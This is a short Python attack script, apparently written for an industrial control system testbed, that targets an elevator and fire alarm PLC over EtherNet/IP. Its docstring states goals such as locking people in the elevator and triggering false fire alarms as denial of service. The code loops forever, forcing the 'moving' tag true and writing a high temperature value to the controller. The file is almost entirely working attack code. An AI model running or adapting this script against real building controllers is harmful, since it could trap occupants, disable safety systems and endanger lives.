"""Elevator fire alarm system attack :
 1 If moving =true is detected and moving is set to true from now on, the person in the elevator will be locked in the elevator; 
 2 Change the temperature, so that the fire alarm,DOS attack, elevator can not run normally; 
 3 Record the last target floor. If the elevator is still moving when the last target floor is reached,anomaly Behavior; 
 4 Repeatedly trigger the elevator button on the first floor, and set the stair level to 2 all the time. Expectation: The elevator has been stopped on the first floor, and people on the second floor cannot use it
"""

# 1 attack
import time
from pycomm.ab_comm.clx import Driver as ClxDriver

PLC_IPS = {
    'plc1': '192.168.1.151',
}

# label name
MOVING_TAG = 'moving'
THRES_TEMP_TAG = 'ThresTemp'

def read_plc_tag(plc, tag_name):
    try:
        return plc.read_tag(tag_name)[0]
    except Exception as e:
        print("Error reading tag:", e)
        return None

def write_plc_tag(plc, tag_name, value, tag_type):
    try:
        plc.write_tag(tag_name, value, tag_type)
    except Exception as e:
        print("Error writing tag:", e)

def attack_elevator(plc_ip):
    plc = ClxDriver()
    if plc.open(plc_ip):
        detected_moving = False
        while True:
            try:
                moving = read_plc_tag(plc, MOVING_TAG)
                
                if moving:
                    detected_moving = True
                
                if detected_moving:
                    # Once moving is detected as true, set it all the way to true
                    write_plc_tag(plc, MOVING_TAG, 1, 'BOOL')

                # Simulate attack, continuously write high temperature value
                write_plc_tag(plc, THRES_TEMP_TAG, 50, 'REAL')

                time.sleep(1)  # Set the read and write interval
            except Exception as e:
                print("Error:", e)
                break
        plc.close()
    else:
        print("Unable to open", plc_ip)

def main():
    attack_elevator(PLC_IPS['plc1'])

if __name__ == '__main__':
    main()
